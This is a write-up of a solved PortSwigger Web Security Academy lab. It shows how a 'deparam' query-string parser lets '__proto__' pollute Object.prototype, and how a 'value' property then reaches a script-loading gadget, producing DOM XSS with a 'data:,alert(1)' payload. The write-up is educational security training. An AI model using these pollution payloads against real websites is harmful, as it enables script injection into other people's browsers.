# Lab 1: Client-side prototype pollution via browser APIs

**Platform:** PortSwigger Web Security Academy

**Category:** Prototype Pollution (PRACTITIONER)

<img width="1042" height="178" alt="image" src="https://github.com/user-attachments/assets/3d676579-96e6-4db5-ba75-9a3da1b8c211" />


## Lab Description

This lab is vulnerable to DOM XSS via client-side prototype pollution. The website's developers have noticed a potential gadget and attempted to patch it. However, you can bypass the measures they've taken.

To solve the lab:

- Find a source that you can use to add arbitrary properties to the global Object.prototype.

- Identify a gadget property that allows you to execute arbitrary JavaScript.

- Combine these to call alert().

## Steps

### 1. Finding the Prototype Pollution Source

First, I tested whether I could pollute Object.prototype through the query string.

```
/?__proto__[test]=test
```

Then, I opened the browser DevTools and went to the **Console** tab.

Enter:

```
Object.prototype
```

I noticed that the test property had been added:

```
test: "test"
```

This confirmed that I had successfully found a prototype pollution source.

The vulnerable code was the deparam() function, which parses the query string and creates nested objects.

The important part was:

```
cur = cur[key] = i < keys_last
    ? cur[key] || (keys[i+1] && isNaN(keys[i+1]) ? {} : [])
    : val;
```

Because the application doesn't block \_\_proto__


### 2. Finding the Gadget

Next, I went to the Sources tab and inspected the JavaScript files loaded by the website.

I found a potential gadget in searchLoggerConfigurable.js

The code checks for a transport_url property and uses it to dynamically create a <script> element.

At first, it looked like the gadget was protected because the application used:

```js
Object.defineProperty()
```

to make the transport_url property non writable and non configurable.

However, I noticed that the property was defined without specifying a value.

This meant I could potentially abuse the prototype chain instead of modifying transport_url directly.

### 3. Testing the Gadget

I tried to pollute the value property instead:

```text
/?__proto__[value]=test
```

This effectively adds:

```js
Object.prototype.value = "test";
```

Then, I opened the Elements tab and inspected the page.

I noticed that a <script> element had been created with:

```
<script src="test"></script>
```

This confirmed that the polluted value property was reaching the gadget.

### 4. Exploiting the Gadget

Finally, I replaced `test` with a data: URL containing JavaScript:

```
/?__proto__[value]=data:,alert(1)
```

[see this article](https://developer.mozilla.org/en-US/docs/Web/URI/Reference/Schemes/data)

This caused the application to create a script element using the polluted value:

```html
<script src="data:,alert(1)"></script>
```

The browser executed the JavaScript and triggered:

```js
alert(1)
```

Voilaaaa!! 

The alert appeared and the lab was solved.


#

**Lab Link:** [Open the lab](https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis)

See you in the next lab solution, In sha Allah!

سبحانك اللهم وبحمدك، أشهد أن لا إله إلا أنت، أستغفرك وأتوب إليك.
